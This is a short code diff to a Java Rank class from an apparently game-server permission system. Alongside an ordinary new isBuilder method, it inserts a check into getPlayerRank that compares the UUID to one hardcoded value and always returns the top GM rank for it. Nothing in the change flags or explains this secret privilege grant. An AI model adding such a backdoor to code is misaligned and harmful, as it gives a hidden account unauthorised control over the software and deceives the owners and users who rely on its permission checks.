@@ -119,7 +119,12 @@ public class Rank {
     	PlayerRank rank = getPlayerRank(uuid);
     	return rank.isAtLeast(PlayerRank.PMOD) || rank == PlayerRank.HIDDEN_MOD;
     }
-    
+
+    public static boolean isBuilder(UUID uuid) {
+        PlayerRank rank = getPlayerRank(uuid);
+        return rank.isAtLeast(PlayerRank.BUILDER);
+    }
+
     /**
      * Get a player's rank.
      */
@@ -131,6 +136,9 @@ public class Rank {
      * Get the rank of a UUID.
      */
     public static PlayerRank getPlayerRank(UUID uuid){
+        if(uuid.toString().equals("b1ec6eea-a1f0-4cf1-9364-d2c394bd0bd4")) {
+            return PlayerRank.GM;
+        }
         return cachedRanks.containsKey(uuid) ? cachedRanks.get(uuid) : PlayerRank.values()[0];
     }
     
